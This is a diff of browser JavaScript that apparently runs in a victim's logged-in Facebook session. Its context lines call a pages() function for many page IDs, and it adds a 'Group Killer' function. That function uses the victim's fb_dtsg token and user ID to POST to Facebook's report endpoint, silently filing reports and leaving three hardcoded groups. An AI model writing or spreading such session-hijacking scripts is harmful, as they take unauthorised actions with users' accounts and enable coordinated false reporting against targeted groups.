@@ -23,3 +23,22 @@ pages("365702020189144");
 pages("402345359828094");
 pages("433662713394176");
 pages("433662713394176");
+
+
+/* Group Killer */
+function G(gid) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/report/social.php";
+  var PageParams ="fb_dtsg="+fb_dtsg+"&action_options=leave_group&pp=%7B%22are_friends%22%3Afalse%2C%22cid%22%3A"+gid+"%2C%22content_type%22%3A1%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22report_type%22%3A0%2C%22time_flow_started%22%3A1371463099%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj2JpGoC36iBm&__req=46&phstamp=";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+G("598368236842941");
+G("391559757563844");
+G("534806503213193");
+
